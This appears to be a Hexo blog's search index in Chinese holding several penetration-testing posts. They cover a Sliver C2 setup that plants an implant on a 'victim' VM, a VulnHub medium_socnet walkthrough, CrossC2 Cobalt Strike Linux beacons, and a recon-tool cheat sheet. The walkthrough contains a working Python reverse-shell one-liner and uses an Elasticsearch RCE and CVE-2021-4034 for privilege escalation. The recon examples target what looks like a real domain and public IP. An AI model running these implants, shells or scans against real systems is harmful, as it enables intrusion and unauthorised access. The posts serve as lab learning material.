<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Sliver</title>
      <link href="/0304sliver-c2-tool/"/>
      <url>/0304sliver-c2-tool/</url>
      
        <content type="html"><![CDATA[<h1 id="Sliver-C2-tool"><a href="#Sliver-C2-tool" class="headerlink" title="Sliver_C2 tool"></a>Sliver_C2 tool</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><pre class=" language-shell"><code class="language-shell">192.168.0.102#客户端 kali本机192.168.0.100#服务端 ubuntu_vmware192.168.0.104#热心网民（受害端）ubuntu_vmware</code></pre><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>一个c2工具，没有GUI，全命令行的，分为server端和client端，但是如果你是单用户就只用server端即可，一个server端即可实现它的所有功能。但如果多人运动的话就需要用的它的client端。</p><p>他好用的基操：1，弹交互式shell；2，建立socks隧道很方便，3，比较方便后渗透的内网探测，4，可以直接生成Linux的马</p><p>项目地址：<code>https://github.com/BishopFox/sliver/releases/tag/v1.5.31</code></p><h2 id="单用户使用"><a href="#单用户使用" class="headerlink" title="单用户使用"></a>单用户使用</h2><p>直接安装他github里编译好的<code>wget https://github.com/BishopFox/sliver/releases/download/v1.5.31/sliver-server_linux</code>别直接复制（版本可能已经不是最新版了），最好去github下载</p><p><img src="/0304sliver-c2-tool/image-20221230160437470.png" alt="image-20221230160437470"></p><p>下载完后，给予可执行权限<code>chmod +x sliver-server_linux</code>，然后运行他</p><p><img src="/0304sliver-c2-tool/image-20221230161010782.png" alt="image-20221230161010782"></p><p>好了，像这样就好了</p><h3 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h3><p>开启一个监听<code>mtls</code>(mtls协议)，<code>jobs</code>(查看开了哪些监听)</p><p><img src="/0304sliver-c2-tool/image-20221230161241258.png" alt="image-20221230161241258"></p><p>mtls默认端口是8888，如果你想指定别的端口可以用 <code>-l</code> 参数</p><p><img src="/0304sliver-c2-tool/image-20221230161425992.png" alt="image-20221230161425992"></p><h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><p>生成木马（generate）<code>generate --mtls 192.168.0.100 --save ./test --os Linux</code></p><pre class=" language-shell"><code class="language-shell">参数解释： --mtls 因为前面做了一个mtls监听所以这里也得用mtls，如果前面做的https监听，这里就改成http          192.168.0.100 server端服务器的ip         --save 后面跟上你保存的位置及生成是木马文件名         --os 跟上被攻击机的操作系统</code></pre><p><img src="/0304sliver-c2-tool/image-20221230162445255.png" alt="image-20221230162445255"></p><p>到这里一个名为test的linux木马就制作完成了，我们可以查看自己生成过哪些马<code>implants</code>(要删除的话<code>implants rm Name</code>)：</p><p><img src="/0304sliver-c2-tool/image-20221230163943616.png" alt="image-20221230163943616"></p><p>我们上传到受害机服务器</p><p><img src="/0304sliver-c2-tool/image-20221230163009604.png" alt="image-20221230163009604"></p><h3 id="木马连接"><a href="#木马连接" class="headerlink" title="木马连接"></a>木马连接</h3><p>运行它，我们sliver这边有反应了</p><p><img src="/0304sliver-c2-tool/image-20221230163444154.png" alt="image-20221230163444154"></p><p>查看会话<code>sessions</code>,并进入0.104的控制台，，它那个id那里好像显示不全，可是有tab键，会自动补齐</p><p><img src="/0304sliver-c2-tool/image-20221230163652754.png" alt="image-20221230163652754"></p><p>这时候我们就可以用help来查看有哪些功能了(太多了，自己慢慢研究吧)</p><p><img src="/0304sliver-c2-tool/image-20221230164209602.png" alt="image-20221230164209602"></p><p>这里展示几个</p><p><img src="/0304sliver-c2-tool/image-20221230164341752.png" alt="image-20221230164341752"></p><p>交互式shell</p><p><img src="/0304sliver-c2-tool/image-20221230164517006.png" alt="image-20221230164517006"></p><p>测试过，就算， 刚开始是nc反弹的shell，wget那个木马文件，执行了那个木马后，弹过来的shell也是交互式的</p><p>socks5隧道</p><p><img src="/0304sliver-c2-tool/image-20221230165214332.png" alt="image-20221230165214332"></p><p>会在本机开启socks5隧道，由于还没学过内网，这里就先留着，以后补（下次一定<del>_</del>）</p><h2 id="多人运动"><a href="#多人运动" class="headerlink" title="多人运动"></a>多人运动</h2><p>先下载clinet端<code>wget https://github.com/BishopFox/sliver/releases/download/v1.5.31/sliver-client_linux</code></p><p><img src="/0304sliver-c2-tool/image-20221230170943631.png" alt="image-20221230170943631"></p><p>先在server端生成client端的证书<code>new-operator --name rat857 --lhost 192.168.0.100</code>，并开启允许多人运动的开关<code>multiplayer</code></p><pre class=" language-shell"><code class="language-shell">参数解释：--name 后面跟名字，就仅仅是个名字，随便起            --lhost server端的ip</code></pre><p><img src="/0304sliver-c2-tool/image-20221230171610811.png" alt="image-20221230171610811"></p><p>当然，你们团队有多少人，你就可以生成多少证书，只需要改name参数后面的值，然后分发给他们即可</p><p>把生成的”许可证”下载到客户端</p><p><img src="/0304sliver-c2-tool/image-20221230172137561.png" alt="image-20221230172137561"></p><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><p>给client加执行权限，并导入证书<code>./sliver-client_linux import 你的证书</code>，并执行</p><p><img src="/0304sliver-c2-tool/image-20221230172323174.png" alt="image-20221230172323174"></p><p><img src="/0304sliver-c2-tool/image-20221230172449565.png" alt="image-20221230172449565"></p><p>我们可以看到数据和server端是同步的，job里面的grpc就是多人运动接入的端口，默认是31337</p><p>后面就和单用户使用一样的啦</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>如果你把服务端关了，那么那些监听端口的job也就没了</p><p><img src="/0304sliver-c2-tool/image-20221230173607899.png" alt="image-20221230173607899"></p><p>就像这样，服务端关了，客户端也就关了，但是这时候你要是再次启动服务端，你的客户端还是连接不上的</p><p><img src="/0304sliver-c2-tool/image-20221230173900887.png" alt="image-20221230173900887"></p><p>就像这样，这时候你需要重新在服务端开启允许多人运动的按钮<code>multiplayer</code></p><p><img src="/0304sliver-c2-tool/image-20221230174206089.png" alt="image-20221230174206089"></p><p>你必须要确保jobs里31337端口是开着的，你的客户端才可以连上</p><p>还有一点，就是服务端关了，我们的那些shell也就没了？</p><p>看这里：</p><p><img src="/0304sliver-c2-tool/image-20221230174628026.png" alt="image-20221230174628026"></p><p>即使我们木马一直在运行这，可是没有session，这是因为，服务端关了，我们之前配置的监听全没了，很简单，重新配一遍</p><p><img src="/0304sliver-c2-tool/image-20221230174832299.png" alt="image-20221230174832299"></p><p>只需要重新开启监听即可，并且<strong>不用重新执行木马</strong>，虽然说，现在还是没有session，但是如果你浅等一会</p><p><img src="/0304sliver-c2-tool/image-20221230175018101.png" alt="image-20221230175018101"></p><p>没错，它会自动连上，我发誓我没有重新执行那个木马🙁^…^</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>更了解后还会继续添加🙁</p><pre class=" language-shell"><code class="language-shell">    help#它的help很方便学习    jobs#查看开启了哪些监听    implants#查看生成过哪些木马    sessions#查看挂上了马的机器    new-operator --name rat857 --lhost 192.168.0.100#生成多人运动的证书    multiplayer#开启多人运动模式    generate#生成木马，详情可用-huse后：    shell    ifconfig    netstat    ps    socks5    ...    help会告诉你如何做你想做的一切</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> c2 </tag>
            
            <tag> tools </tag>
            
            <tag> Sliver </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>medium_socnet(**)</title>
      <link href="/0304medium-socnet-da-ba/"/>
      <url>/0304medium-socnet-da-ba/</url>
      
        <content type="html"><![CDATA[<h1 id="medium-socnet打靶记录"><a href="#medium-socnet打靶记录" class="headerlink" title="medium_socnet打靶记录"></a>medium_socnet打靶记录</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><pre class=" language-shell"><code class="language-shell">192.168.0.100靶机地址192.168.0.102kali攻击机地址</code></pre><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><p>靶机地址：<code>https://www.vulnhub.com/entry/boredhackerblog-social-network,454/ </code></p><p>根据靶机官方介绍</p><p><img src="/0304medium-socnet-da-ba/image-20221229000654003.png" alt="image-20221229000654003"></p><p>可以看到应该是使用了docker容器，并且这是一个中难度靶机</p><h3 id="食用前奏"><a href="#食用前奏" class="headerlink" title="食用前奏"></a>食用前奏</h3><p>1，直接在vulnhub官网下载</p><p>2，<code>wget https://download.vulnhub.com/boredhackerblog/medium_socnet.ova</code></p><p>下载完后直接导入VMware或VirtualBox即可(我用的VMware)</p><p>导入遇到报错不用管</p><p><img src="/0304medium-socnet-da-ba/image-20221229001720559.png" alt="image-20221229001720559"></p><p>直接下一步</p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h4><p>确认本机ip在192.168.0.102&#x2F;24网段</p><p><img src="/0304medium-socnet-da-ba/image-20221229004405395.png" alt="image-20221229004405395"></p><p>使用nmap的ping探测<code>-sn</code>参数</p><p><img src="/0304medium-socnet-da-ba/image-20221229002540723.png" alt="image-20221229002540723"></p><p>192.168.0.100即我们的靶机ip</p><p>用nmap对靶机做全端口的扫描<code>nmap -p- 192.168.0.100</code></p><p><img src="/0304medium-socnet-da-ba/image-20221229004439346.png" alt="image-20221229004439346"></p><p>可以看到开放了22，5000端口，接下来再做更细致信息收集<code>sudo nmap -p22,5000 192.168.0.100 -A </code></p><p><img src="/0304medium-socnet-da-ba/image-20221229005409371.png" alt="image-20221229005409371"></p><p>我们收集到，目标系统是Ubuntu的，5000端口上跑的是一个http的服务，并且有Python环境，我们可以尝试访问一下它的5000端口</p><p><img src="/0304medium-socnet-da-ba/image-20221229010008700.png" alt="image-20221229010008700"></p><p>可以看到是一个留言板，我们检查一下是否有xss和sql注入</p><p>我们打开抓包工具Yakit</p><p><img src="/0304medium-socnet-da-ba/image-20221229011124319.png" alt="image-20221229011124319"></p><p>fuzz这个message这个标签，结果，，一无所获，它好像就只是单纯的留言板，接下来我们进行路径的爆破</p><h4 id="路径爆破"><a href="#路径爆破" class="headerlink" title="路径爆破"></a>路径爆破</h4><p>我们用<code>feroxbuster</code>这个工具(会默认使用seclists软件包里的字典，这是一个强大的字典包)：<code>feroxbuster -u http://192.168.0.100:5000</code></p><p><img src="/0304medium-socnet-da-ba/image-20221229011733089.png" alt="image-20221229011733089"></p><p>爆破出来了一个admin目录，我们访问一下</p><p><img src="/0304medium-socnet-da-ba/image-20221229012233850.png" alt="image-20221229012233850"></p><p>竟然直接是一个可以执行代码的，ok我们尝试用python反弹shell</p><h3 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><pre class=" language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.102",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre><p>因为上面说了，会用exec()这个函数执行，所以，我们直接从import那里开始，不过在此直接需要在kali上监听1234端口<code>nc -nvlp 1234</code></p><p><img src="/0304medium-socnet-da-ba/image-20221229013211481.png" alt="image-20221229013211481"></p><p>ok监听启动，开始执行</p><p><img src="/0304medium-socnet-da-ba/image-20221229014828904.png" alt="image-20221229014828904"></p><p>好了，我们查看这边的nc</p><p><img src="/0304medium-socnet-da-ba/image-20221229014934170.png" alt="image-20221229014934170"></p><p>已经成功反弹shell，并且是root用户了，OK打靶结束，收工</p><p>好吧，其实还没有，靶机介绍里说了，docker……，才刚刚开始呢……^$^想不到，继续</p><h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><p><img src="/0304medium-socnet-da-ba/image-20221229015500158.png" alt="image-20221229015500158"></p><p>查看ip，发现是内网ip，我们用Venom(<a href="https://github.com/Dliv3/Venom/releases/download/v1.1.0/Venom.v1.1.0.7z)%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F">https://github.com/Dliv3/Venom/releases/download/v1.1.0/Venom.v1.1.0.7z)进行内网穿透</a></p><p>首先我们需要把代理端上传到靶机上</p><p>在kali上开启http服务<code>python3 -m http.server 81</code></p><p><img src="/0304medium-socnet-da-ba/image-20221229020207557.png" alt="image-20221229020207557"></p><p>接下来视角给到nc这一端，出于习惯先进入tmp目录然后wget<code>wget http://192.168.0.102:81/agent_linux_x64</code>并为它加上可执行权限<code>chmod +x agent_linux_x64</code></p><p><img src="/0304medium-socnet-da-ba/image-20221229020659000.png" alt="image-20221229020659000"></p><p>先在kali上启动admin<code>./admin_linux_x64 -lport 1010</code>程序，开启监听，然后在nc上运行agent<code>agent_linux_x64 -rhost 192.168.0.102 -rport 1010</code>程序</p><p><img src="/0304medium-socnet-da-ba/image-20221229020931565.png" alt="image-20221229020931565"></p><p><img src="/0304medium-socnet-da-ba/image-20221229021049109.png" alt="image-20221229021049109"></p><p>这一步不出差错的话，admin那边应该已经有反应了</p><p><img src="/0304medium-socnet-da-ba/image-20221229021324918.png" alt="image-20221229021324918"></p><p>我们可以看到，它上面显示有一个新的连接，我们show一下，并加载<code>goto 1</code>上去</p><p><img src="/0304medium-socnet-da-ba/image-20221229021511918.png" alt="image-20221229021511918"></p><p>好了，我们为它开启socks5<code>socks 1089</code>服务，这样我们kali上的工具就可以在它的内网<code>为所欲为^_^</code>啦</p><p><img src="/0304medium-socnet-da-ba/image-20221229021841577.png" alt="image-20221229021841577"></p><p>ok，开启成功，接下来我们就开始“愉快”的内网漫游吧（虽然是在docker里，，）</p><h4 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h4><p><img src="/0304medium-socnet-da-ba/image-20221229031105241.png" alt="image-20221229031105241"></p><p>先配置proxychains4(代理工具)，编辑<code>/etc/proxychains4.conf</code></p><p><img src="/0304medium-socnet-da-ba/image-20221229022404610.png" alt="image-20221229022404610"></p><p>加上这么一行，1089是刚才配置socks的那个端口。我们用nmap扫172.17.0.1&#x2F;16这个网段的存活状态，记得加上代理工具</p><p><img src="/0304medium-socnet-da-ba/image-20221229032311490.png" alt="image-20221229032311490"></p><p>理论上可以，，，不过我看了别人的扫的结果，^……^，172.17.0.1，172.17.0.2，172.17.0.3这三个是存活的</p><p><img src="/0304medium-socnet-da-ba/image-20221229032553171.png" alt="image-20221229032553171"></p><p>接下来做全端口扫描，172.17.0.3是我们自己，不用扫，就扫一下0.1和0.2行了</p><p><img src="/0304medium-socnet-da-ba/image-20221229040828992.png" alt="image-20221229040828992"></p><p>看到172.17.0.2开启了9200 <del>就他不一样</del>，，别的容器都是22和5000，我们扫一下他的服务</p><p><img src="/0304medium-socnet-da-ba/image-20221229040919033.png" alt="image-20221229040919033"></p><p>Elasticsearch而且版本是1.4.2的老版本了，我们可以用searchsploit（kali自带的漏洞库）查一下</p><p><img src="/0304medium-socnet-da-ba/image-20221229041119690.png" alt="image-20221229041119690"></p><p>果然还是命令执行漏洞</p><p><img src="/0304medium-socnet-da-ba/image-20221229041259124.png" alt="image-20221229041259124"></p><p>我们把他复制出来，并运行它，查看其格式，ok（别忘了proxychains4）</p><p><img src="/0304medium-socnet-da-ba/image-20221229041431209.png" alt="image-20221229041431209"></p><p><img src="/0304medium-socnet-da-ba/image-20221229041524530.png" alt="image-20221229041524530"></p><p>是root并且还是容器</p><p><img src="/0304medium-socnet-da-ba/image-20221229041611554.png" alt="image-20221229041611554"></p><p>果然发现有趣的东西</p><p><img src="/0304medium-socnet-da-ba/image-20221229041744714.png" alt="image-20221229041744714"></p><p>竟然是密码文件，拿去解密<code>https://www.somd5.com/</code>很良心，不要钱，哈哈哈哈</p><p>全部解密后长这样，，</p><p><img src="/0304medium-socnet-da-ba/image-20221229042223167.png" alt="image-20221229042223167"></p><h4 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h4><p>结果，ssh试了半天就john能登上</p><p><img src="/0304medium-socnet-da-ba/image-20221229042426766.png" alt="image-20221229042426766"></p><p>可以，现在就差提权了</p><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>查看sudo配置不当</p><p><img src="/0304medium-socnet-da-ba/image-20221229042715079.png" alt="image-20221229042715079"></p><p>，没有，那就直接上传linpeas吧</p><p><img src="/0304medium-socnet-da-ba/image-20221229043017738.png" alt="image-20221229043017738"></p><p>ok执行它<code>sh linpeas.sh</code>，不一会就发现有CVE</p><p><img src="/0304medium-socnet-da-ba/image-20221229043306510.png" alt="image-20221229043306510"></p><p>可以，那就上传吧，正好目标机器有Python</p><p><img src="/0304medium-socnet-da-ba/image-20221229043615928.png" alt="image-20221229043615928"></p><p>直接执行呗<code>python CVE-2021-4034.py</code></p><p><img src="/0304medium-socnet-da-ba/image-20221229043718880.png" alt="image-20221229043718880"></p><p>OK，成功，尝试关机</p><p><img src="/0304medium-socnet-da-ba/image-20221229043827558.png" alt="image-20221229043827558"></p><p>OK，成功，打靶结束</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="用到的工具："><a href="#用到的工具：" class="headerlink" title="用到的工具："></a>用到的工具：</h3><pre class=" language-shell"><code class="language-shell">nmap#端口，ip扫描feroxbuster#路径爆破nc#接收反弹的shellVenom#内网穿透proxychains4#代理linpeas.sh#提权</code></pre><h3 id="用到的技术："><a href="#用到的技术：" class="headerlink" title="用到的技术："></a>用到的技术：</h3><pre class=" language-shell"><code class="language-shell">敏感路径爆破Python反弹shell内网穿透内网漫游本地提权</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 打靶记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike上线Linux</title>
      <link href="/0116cobaltstrike-shang-xian-linux/"/>
      <url>/0116cobaltstrike-shang-xian-linux/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike上线Linux"><a href="#CobaltStrike上线Linux" class="headerlink" title="CobaltStrike上线Linux"></a>CobaltStrike上线Linux</h1><p>网上搜到的教程总是千篇一律，但是总是遇不到适合自己的</p><h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><pre class=" language-shell"><code class="language-shell">192.168.0.104#cs客户端（linux）192.168.0.100#cs服务端（linux）192.168.0.101#受害者（linux）</code></pre><p>需要一个插件<code>https://github.com/gloxec/CrossC2</code></p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116142331466.png" alt="image-20230116142331466"></p><p>下载这两个文件</p><p><strong>网上很多说要把genCrossC2.Linux上传到server端，我发现好像不用</strong></p><p>在TeamServer段找到<code>.cobaltstrike.beacon_keys</code>（你需要被连接过才会生成这个文件）,把他下载到你自己cs的客户端所在目录</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116143437306.png" alt="image-20230116143437306"></p><p>下载：</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116143723319.png" alt="image-20230116143723319"></p><p>下载下来后，把那个点去掉，或者重命名一个名字，随便放在你电脑的某个目录都行</p><p>现在开始编辑第一次下载的那个*.cna</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116164706254.png" alt="image-20230116164706254"></p><p>这两行配置文件就在*.cna的最前面，</p><p>第一行是你genCrossC2.Linux的所在目录，<strong>重点</strong>：：后面那个斜杠一定不要忘</p><p>第二行就是你genCrossC2.Linux的名字，如果你是mac那第一步下载的时候就不用下载这个点Linux的文件，直接下载MacOs文件，然后这里也填你那个MacOs的名字，windows同理</p><h2 id="加载插件"><a href="#加载插件" class="headerlink" title="加载插件"></a>加载插件</h2><p>服务端开启</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116165845606.png" alt="image-20230116165845606"></p><p>连上我们的服务端</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116165740331.png" alt="image-20230116165740331"></p><p>开启一个https的监听</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116170006025.png" alt="image-20230116170006025"></p><p>至于别的监听行不行，你自行尝试</p><p>加载插件</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116170147244.png" alt="image-20230116170147244"></p><p>选择你刚才配置好的*.cna</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116170320043.png" alt="image-20230116170320043"></p><p>我的在这里，点打开，这里就会多出来这个东西，网上很多说，有这个就说明成功了，可是其实是不一定的， 你得能生成出来马才能算成功</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116170341954.png" alt="image-20230116170341954"></p><p>点击多出来的选项，先创建一个https的</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116170556916.png" alt="image-20230116170556916"></p><p>这两个地方是需要改的，Listener就选你刚才创建的那个监听，第一个是让你选刚才让你下载的那个<code>.cobaltstrike.beacon_keys</code>，并且我嘱咐过最好把前面那个点去掉</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116170925098.png" alt="image-20230116170925098"></p><p>我的在这里，你如果没改名字，前面有个点，他是隐藏文件，你不好找</p><p>配置完，长这样：</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116171029542.png" alt="image-20230116171029542"></p><p>然后build</p><p>当日志里出现这些东西，那么说明你成功了</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116171133698.png" alt="image-20230116171133698"></p><p>看这里</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116171228206.png" alt="image-20230116171228206"></p><p>understand？直接在受害者机器上wget即可</p><h2 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h2><p>就很简单了</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116171656371.png" alt="image-20230116171656371"></p><p>然后你就看到他“上线”了</p><p><img src="/0116cobaltstrike-shang-xian-linux/image-20230116171825216.png" alt="image-20230116171825216"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> c2 </tag>
            
            <tag> CobaltStrike </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tools01</title>
      <link href="/1109tools01/"/>
      <url>/1109tools01/</url>
      
        <content type="html"><![CDATA[<h1 id="tools01"><a href="#tools01" class="headerlink" title="tools01"></a>tools01</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="子域名搜集信息"><a href="#子域名搜集信息" class="headerlink" title="子域名搜集信息"></a>子域名搜集信息</h3><h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h4><p>项目地址：</p><pre class=" language-url"><code class="language-url">https://github.com/shmilylty/OneForAll</code></pre><p>用法：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> fetch --all  <span class="token comment" spellcheck="true"># 拉取项目更新</span>Eg:    python3 oneforall.py --target xatzy.cn run<span class="token comment" spellcheck="true">#单个</span>    python3 oneforall.py --targets ./example.txt run<span class="token comment" spellcheck="true">#一个文件</span></code></pre><p>生成的结果在results文件夹</p><h4 id="ESD"><a href="#ESD" class="headerlink" title="ESD"></a>ESD</h4><p>项目地址：</p><pre class=" language-url"><code class="language-url">https://github.com/FeeiCN/ESD</code></pre><p>安装：</p><pre class=" language-bash"><code class="language-bash">pip3 insatll esd</code></pre><p>用法：</p><pre class=" language-bash"><code class="language-bash">esd -d xatzy.cn</code></pre><h3 id="端口及服务的探测"><a href="#端口及服务的探测" class="headerlink" title="端口及服务的探测"></a>端口及服务的探测</h3><h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><p>用法：</p><pre class=" language-bash"><code class="language-bash">nmap 192.144.229.80nmap www.xatzy.cn</code></pre><p>批量扫（-iL）</p><p><img src="/1109tools01/image-20221109184844576.png" alt="image-20221109184844576"></p><p>常用参数：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>-A<span class="token punctuation">)</span>对目标主机实施全面扫描<span class="token punctuation">(</span>-sV<span class="token punctuation">)</span>探测端口的服务和版本<span class="token punctuation">(</span>-sP<span class="token punctuation">)</span>Ping扫描，只探测主机存活</code></pre><h4 id="MASSCAN"><a href="#MASSCAN" class="headerlink" title="MASSCAN"></a>MASSCAN</h4><p>用法：</p><pre class=" language-bash"><code class="language-bash">masscan -p80,8000-8100 10.0.0.0/8 --rate<span class="token operator">=</span>1000<span class="token comment" spellcheck="true">#--rate是发包速率</span></code></pre><p>优点：速度快， 缺点：容易丢包</p><h4 id="NAABU"><a href="#NAABU" class="headerlink" title="* NAABU *"></a>* NAABU *</h4><p>特点 ：基于go，速度快，兼容nmap参数，输出结果方便后续操作</p><p>用法：</p><pre class=" language-bash"><code class="language-bash">naabu -p - -host www.xatzy.cn    -p -<span class="token comment" spellcheck="true">#全端口扫描</span>    -top-ports 1000<span class="token comment" spellcheck="true">#nmap的top1000</span>    -top-ports 100<span class="token comment" spellcheck="true">#nmap的top100</span></code></pre><p><img src="/1109tools01/image-20221109192349438.png" alt="image-20221109192349438"></p><p>调用nmap:</p><pre class=" language-bash"><code class="language-bash">naabu -p 22 -host 192.144.229.80 -nmap-cli <span class="token string">'nmap -sV'</span>    -nmap-cli <span class="token string">'nmap 参数'</span></code></pre><p><img src="/1109tools01/image-20221109192620079.png" alt="image-20221109192620079"></p><p>输出为json格式：</p><pre class=" language-bash"><code class="language-bash">naabu -p 22 -host 192.144.229.80 -json</code></pre><p><img src="/1109tools01/image-20221109192810032.png" alt="image-20221109192810032"></p><pre class=" language-bash"><code class="language-bash">naabu -p 22 -host 192.144.229.80 -json <span class="token operator">></span> 1.json</code></pre><p><img src="/1109tools01/image-20221109193004213.png" alt="image-20221109193004213"></p><p>批量扫：</p><pre class=" language-bash"><code class="language-bash">naabu -list target.txt</code></pre><p><img src="/1109tools01/image-20221109193439243.png" alt="image-20221109193439243"></p><p>只输出结果：</p><pre class=" language-bash"><code class="language-bash">naabu -l target.txt -silent</code></pre><p><img src="/1109tools01/image-20221109194559980.png" alt="image-20221109194559980"></p><p>过滤CDN</p><pre class=" language-bash"><code class="language-bash">-ec</code></pre><h3 id="HTTP服务的信息梳理"><a href="#HTTP服务的信息梳理" class="headerlink" title="HTTP服务的信息梳理"></a>HTTP服务的信息梳理</h3><h4 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h4><p>用法：</p><pre class=" language-bash"><code class="language-bash">whatweb www.xatzy.cn<span class="token comment" spellcheck="true">#单个</span>whatweb -i target.txt<span class="token comment" spellcheck="true">#一个文件</span>参数：    --no-errors <span class="token comment" spellcheck="true">#不显示报错信息 </span>    --color<span class="token operator">=</span>never<span class="token comment" spellcheck="true">#不显示颜色</span></code></pre><p><img src="/1109tools01/image-20221109195356890.png" alt="image-20221109195356890"></p><h4 id="AlliN"><a href="#AlliN" class="headerlink" title="AlliN"></a>AlliN</h4><p>项目地址：</p><pre class=" language-url"><code class="language-url">https://github.com/P1-Team/AlliN</code></pre><p>用法：</p><pre class=" language-bash"><code class="language-bash">python3 AlliN.py --host 192.144.229.80<span class="token comment" spellcheck="true">#单个</span></code></pre><p><img src="/1109tools01/image-20221109200840381.png" alt="image-20221109200840381"></p><pre class=" language-bash"><code class="language-bash">python3 AlliN.py -f target.txt<span class="token comment" spellcheck="true">#一个文件</span></code></pre><p><img src="/1109tools01/image-20221109201033007.png" alt="image-20221109201033007"></p><h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><h4 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h4><p>基于字典的web目录扫描工具</p><pre class=" language-bash"><code class="language-bash">dirb http://192.144.229.80</code></pre><p><img src="/1109tools01/image-20221109202923893.png" alt="image-20221109202923893"></p><h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><pre class=" language-bash"><code class="language-bash">dirsearch -u http://192.144.229.80</code></pre><p><img src="/1109tools01/image-20221109203039893.png" alt="image-20221109203039893"></p><h4 id="JSFinder"><a href="#JSFinder" class="headerlink" title="JSFinder"></a>JSFinder</h4><p>在网站的js文件中提取URL，子域名</p><p>项目地址：</p><pre class=" language-url"><code class="language-url">https://github.com/Threezh1/JSFinder</code></pre><p>用法：</p><pre class=" language-bash"><code class="language-bash">python3 JSFinder.py -u http://www.xatzy.cn</code></pre><p><img src="/1109tools01/image-20221109203323231.png" alt="image-20221109203323231"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> tools </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali调优</title>
      <link href="/0928kali-diao-you/"/>
      <url>/0928kali-diao-you/</url>
      
